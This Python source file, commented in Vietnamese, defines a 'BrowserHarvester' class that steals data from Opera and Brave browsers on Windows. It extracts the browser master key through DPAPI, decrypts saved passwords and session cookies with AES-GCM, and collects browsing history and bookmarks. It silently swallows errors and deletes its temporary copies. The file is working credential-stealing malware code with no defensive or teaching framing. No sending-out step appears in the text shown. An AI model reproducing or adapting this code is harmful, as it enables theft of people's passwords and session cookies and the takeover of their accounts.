import os
import json
import shutil
import sqlite3
import win32crypt
from pathlib import Path
from typing import Dict, List, Optional
from Crypto.Cipher import AES
import base64

class BrowserHarvester:
    """Thu thập credentials từ các trình duyệt phổ biến"""

    def __init__(self):
        self.browsers = {
            'opera': {
                'path': os.path.join(os.getenv('APPDATA'), 'Opera Software\\Opera Stable'),
                'login_data': 'Login Data',
                'cookies': 'Cookies',
                'history': 'History',
                'bookmarks': 'Bookmarks'
            },
            'brave': {
                'path': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware\\Brave-Browser\\User Data\\Default'),
                'login_data': 'Login Data',
                'cookies': 'Cookies', 
                'history': 'History',
                'bookmarks': 'Bookmarks'
            }
        }
        
    def get_master_key(self, browser_path: str) -> Optional[bytes]:
        """Extract master key từ Local State"""
        try:
            with open(os.path.join(browser_path, '..\\Local State'), 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
                
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            # Decrypt master key using Windows Data Protection API
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
            
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        """Decrypt password sử dụng master key"""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
            
        except Exception:
            return ""

    def get_browser_data(self, browser: str) -> Dict:
        """Thu thập toàn bộ dữ liệu từ browser"""
        try:
            browser_path = self.browsers[browser]['path']
            if not os.path.exists(browser_path):
                return {}
                
            master_key = self.get_master_key(browser_path)
            if not master_key:
                return {}
                
            # Copy database files để tránh lock
            temp_folder = os.path.join(os.getenv('TEMP'), f'browser_{browser}')
            os.makedirs(temp_folder, exist_ok=True)
            
            result = {
                'credentials': [],
                'cookies': [],
                'history': [],
                'bookmarks': []
            }
            
            # Extract credentials
            login_db = os.path.join(browser_path, self.browsers[browser]['login_data'])
            if os.path.exists(login_db):
                temp_db = os.path.join(temp_folder, "Login.db")
                shutil.copy2(login_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    if not row[2]:  # Skip if no password
                        continue
                        
                    password = self.decrypt_password(row[2], master_key)
                    result['credentials'].append({
                        'url': row[0],
                        'username': row[1],
                        'password': password
                    })
                    
                cursor.close()
                conn.close()
                
            # Extract cookies 
            cookie_db = os.path.join(browser_path, self.browsers[browser]['cookies'])
            if os.path.exists(cookie_db):
                temp_db = os.path.join(temp_folder, "Cookies.db")
                shutil.copy2(cookie_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                
                for row in cursor.fetchall():
                    if not row[2]:
                        continue
                        
                    cookie_value = self.decrypt_password(row[2], master_key) 
                    result['cookies'].append({
                        'host': row[0],
                        'name': row[1],
                        'value': cookie_value
                    })
                    
                cursor.close()
                conn.close()
                
            # Extract history
            history_db = os.path.join(browser_path, self.browsers[browser]['history'])
            if os.path.exists(history_db):
                temp_db = os.path.join(temp_folder, "History.db")
                shutil.copy2(history_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
                
                for row in cursor.fetchall():
                    result['history'].append({
                        'url': row[0],
                        'title': row[1],
                        'timestamp': row[2]
                    })
                    
                cursor.close()
                conn.close()
                
            # Extract bookmarks
            bookmarks_file = os.path.join(browser_path, self.browsers[browser]['bookmarks'])
            if os.path.exists(bookmarks_file):
                with open(bookmarks_file, 'r', encoding='utf-8') as f:
                    bookmarks = json.load(f)
                    result['bookmarks'] = self._extract_bookmarks(bookmarks['roots'])
                    
            # Cleanup
            shutil.rmtree(temp_folder, ignore_errors=True)
            
            return result
            
        except Exception:
            return {}
            
    def _extract_bookmarks(self, bookmark_data: Dict) -> List:
        """Đệ quy extract bookmarks từ JSON data"""
        bookmarks = []
        
        for item in bookmark_data.values():
            if isinstance(item, dict):
                if item.get('type') == 'url':
                    bookmarks.append({
                        'url': item.get('url'),
                        'name': item.get('name'),
                        'added': item.get('date_added')
                    })
                elif item.get('type') == 'folder':
                    bookmarks.extend(self._extract_bookmarks(item.get('children', {})))
                    
        return bookmarks

    def get_all_browsers_data(self) -> Dict:
        """Thu thập dữ liệu từ tất cả các browser được hỗ trợ"""
        result = {}
        for browser in self.browsers:
            browser_data = self.get_browser_data(browser)
            if browser_data:
                result[browser] = browser_data
        return result